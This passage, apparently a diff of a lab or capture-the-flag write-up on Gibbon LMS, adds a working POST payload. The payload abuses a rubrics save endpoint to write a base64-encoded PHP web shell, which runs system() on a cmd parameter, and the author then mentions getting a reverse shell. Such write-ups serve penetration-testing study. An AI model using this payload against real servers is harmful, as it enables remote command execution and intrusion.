@@ -69,4 +69,14 @@ Basically we can access a particular path (`/modules/Rubrics/rubrics_visualise_s
 So, I head over to Burpsuite and send a POST request to above file and ask it to write `php` code into `yuyu.php` file.
 ![[Pasted image 20250829184850.png]]
 
+```
+img=image/png;yuyu,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=yuyu.php&gibbonPersonID=0000000001
+```
+
+The base64 string is the PHP code `<?php echo system($_GET['cmd'])?`.
+Now that we have `yuyu.php` file on server, we can access it at `/Gibbon-LMS/yuyu.php` and we can pass a `cmd` parameter which is a windows command:
+![[Pasted image 20250829185709.png]]
+
+Noice! So, we can now execute commands and get a reverse shell!
+
 
